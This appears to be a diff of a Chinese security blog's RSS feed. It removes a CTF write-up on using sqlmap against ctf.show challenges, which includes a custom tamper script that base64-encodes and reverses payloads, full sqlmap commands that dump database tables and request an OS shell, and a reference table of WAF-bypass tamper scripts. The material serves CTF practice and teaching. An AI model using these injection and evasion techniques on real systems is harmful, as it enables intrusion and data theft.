-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
-&lt;/span>&lt;span class="lnt">6
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="p">){&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">strrev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">strrev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="p">))));&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">waf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="p">){&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/ |\*/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$str&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HIGHEST&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x09&lt;/span>&lt;span class="p">))&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">reversed_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">[::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">reversed_encoded&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">double_reversed_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">encoded&lt;/span>&lt;span class="p">[::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">final_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">double_reversed_encoded&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">final_encoded&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://2a62292f-5ea8-4590-ab1d-3edbbd9b6d20.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://2a62292f-5ea8-4590-ab1d-3edbbd9b6d20.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=eusf2q9tfu758qcjpl98l3rck4&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb212&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://2a62292f-5ea8-4590-ab1d-3edbbd9b6d20.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://2a62292f-5ea8-4590-ab1d-3edbbd9b6d20.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=eusf2q9tfu758qcjpl98l3rck4&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb212&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flavis --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web213">web213
-&lt;/h3>&lt;p>waf一样&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --method&lt;span class="o">=&lt;/span>PUT --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --referer&lt;span class="o">=&lt;/span>ctf.show --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=tpp6v8rj8dr0jpglrfqu0db8a9&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb212&amp;#34;&lt;/span> -D ctfshow_web --tables --batch
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>没有flag表名，尝试连接shell&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --method&lt;span class="o">=&lt;/span>PUT --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --referer&lt;span class="o">=&lt;/span>ctf.show --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=tpp6v8rj8dr0jpglrfqu0db8a9&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://dbae3790-fac5-4d70-948e-72d3aae610c6.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb212&amp;#34;&lt;/span> -D ctfshow_web --tables --batch --os-shell
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-200925.jpg"
-width="2130"
-height="969"
-srcset="https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-200925_hu_1ef8bc13058defb1.jpg 480w, https://baozongwi.xyz/p/sqlmap-usage/QQ20250505-200925_hu_f4d3b4d8b85919eb.jpg 1024w"
-loading="lazy"
-alt="1"
-class="gallery-image"
-data-flex-grow="219"
-data-flex-basis="527px"
->&lt;/p>
-&lt;h2 id="tamper">Tamper
-&lt;/h2>&lt;h3 id="空白字符处理">空白字符处理
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>脚本名称&lt;/th>
-&lt;th>功能描述&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>space2comment.py&lt;/code>&lt;/td>
-&lt;td>使用 &lt;code>/**/&lt;/code> 代替空格&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2dash.py&lt;/code>&lt;/td>
-&lt;td>绕过过滤 &lt;code>=&lt;/code>，用 &lt;code>--&lt;/code> 注释替换空格，后跟随机字符串和换行符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2hash.py&lt;/code>&lt;/td>
-&lt;td>将空格替换为 &lt;code>#&lt;/code> 号，后跟随机字符串和换行符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2morehash.py&lt;/code>&lt;/td>
-&lt;td>将空格替换为 &lt;code>#&lt;/code> 号以及更多随机字符串和换行符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2mssqlblank.py&lt;/code>&lt;/td>
-&lt;td>使用 MSSQL 特有的空白符替换空格&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2mysqlblank.py&lt;/code>&lt;/td>
-&lt;td>使用 MySQL 特有的空白符替换空格&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2mysqldash.py&lt;/code>&lt;/td>
-&lt;td>将空格替换为 &lt;code>--&lt;/code> 破折号注释和换行符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2plus.py&lt;/code>&lt;/td>
-&lt;td>用 &lt;code>+&lt;/code> 替换空格&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2randomblank.py&lt;/code>&lt;/td>
-&lt;td>将空格替换为随机有效的空白字符&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>multiplespaces.py&lt;/code>&lt;/td>
-&lt;td>在 SQL 关键字周围添加多个空格&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>bluecoat.py&lt;/code>&lt;/td>
-&lt;td>用随机有效空白字符替换空格，并将 &lt;code>=&lt;/code> 替换为 &lt;code>like&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>space2comment.py&lt;/code>&lt;/td>
-&lt;td>将空格替换为注释 &lt;code>/**/&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="字符编码与替换">字符编码与替换
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>脚本名称&lt;/th>
-&lt;th>功能描述&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>apostrophemask.py&lt;/code>&lt;/td>
-&lt;td>使用 UTF-8 编码替换引号&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>apostrophenullencode.py&lt;/code>&lt;/td>
-&lt;td>绕过双引号过滤，替换字符和双引号&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>charencode.py&lt;/code>&lt;/td>
-&lt;td>URL 编码&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>charunicodeencode.py&lt;/code>&lt;/td>
-&lt;td>字符串 Unicode 编码&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>chardoubleencode.py&lt;/code>&lt;/td>
-&lt;td>双重 URL 编码（不处理已编码的）&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>randomcase.py&lt;/code>&lt;/td>
-&lt;td>SQL 关键字随机大小写&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>unmagicquotes.py&lt;/code>&lt;/td>
-&lt;td>使用宽字符绕过 GPC addslashes&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>base64encode.py&lt;/code>&lt;/td>
-&lt;td>使用 Base64 编码替换&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="操作符替换">操作符替换
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>脚本名称&lt;/th>
-&lt;th>功能描述&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>equaltolike.py&lt;/code>&lt;/td>
-&lt;td>用 &lt;code>like&lt;/code> 替换等号&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>greatest.py&lt;/code>&lt;/td>
-&lt;td>绕过过滤 &lt;code>&amp;gt;&lt;/code>，用 &lt;code>GREATEST&lt;/code> 替换大于号&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>between.py&lt;/code>&lt;/td>
-&lt;td>用 &lt;code>between&lt;/code> 替换大于号 &lt;code>&amp;gt;&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>ifnull2ifisnull.py&lt;/code>&lt;/td>
-&lt;td>绕过 &lt;code>IFNULL&lt;/code> 过滤，将 &lt;code>IFNULL(A,B)&lt;/code> 替换为 &lt;code>IF(ISNULL(A), B, A)&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="注释与关键字处理">注释与关键字处理
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>脚本名称&lt;/th>
-&lt;th>功能描述&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>halfversionedmorekeywords.py&lt;/code>&lt;/td>
-&lt;td>MySQL 环境下绕过防火墙，在关键字前添加 MySQL 版本注释&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>randomcomments.py&lt;/code>&lt;/td>
-&lt;td>用 &lt;code>/**/&lt;/code> 分割 SQL 关键字&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>modsecurityversioned.py&lt;/code>&lt;/td>
-&lt;td>通过完整查询版本注释绕过过滤&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>versionedmorekeywords.py&lt;/code>&lt;/td>
-&lt;td>使用注释绕过&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>nonrecursivereplacement.py&lt;/code>&lt;/td>
-&lt;td>使用双重查询语句替代 SQL 关键字&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="联合查询处理">联合查询处理
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>脚本名称&lt;/th>
-&lt;th>功能描述&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>unionalltounion.py&lt;/code>&lt;/td>
-&lt;td>将 &lt;code>UNION ALL SELECT&lt;/code> 替换为 &lt;code>UNION SELECT&lt;/code>&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="特殊技巧">特殊技巧
-&lt;/h3>&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>脚本名称&lt;/th>
-&lt;th>功能描述&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>&lt;code>appendnullbyte.py&lt;/code>&lt;/td>
-&lt;td>在有效负载结束位置添加零字节字符编码&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>sp_password.py&lt;/code>&lt;/td>
-&lt;td>在负载末尾追加 &lt;code>sp_password&lt;/code>，使其在 DBMS 日志中自动模糊处理&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&lt;code>securesphere.py&lt;/code>&lt;/td>
-&lt;td>追加特制字符串&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="使用方法">使用方法
-&lt;/h3>&lt;p>在 SQLmap 命令中使用 &lt;code>--tamper&lt;/code> 参数来指定一个或多个 Tamper 脚本：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python sqlmap.py -u &lt;span class="s2">&amp;#34;http://example.com&amp;#34;&lt;/span> --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;space2comment,between&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>可以通过逗号分隔使用多个 Tamper 脚本，按照从左到右的顺序依次应用。&lt;/p>
-&lt;h2 id="小结">小结
-&lt;/h2>&lt;p>很抽象就是我虚拟机比本地跑的快很多，不知道为什么，简单的201，本机跑了五六分钟，但是虚拟机就两分钟的样子，算是深入浅出了一下&lt;strong>sqlmap&lt;/strong>，知道了一些常用的打法，&lt;strong>baozongwi&lt;/strong>现在也会写点简单的tamper了&lt;/p></description></item></channel></rss>
+&lt;p>thinkphp cakephp等框架去慢慢动调挖掘，也是very good，这里只介绍pop的，因为弟弟我实在是太菜😭，后面会其他了，再单独写&lt;/p></description></item></channel></rss>
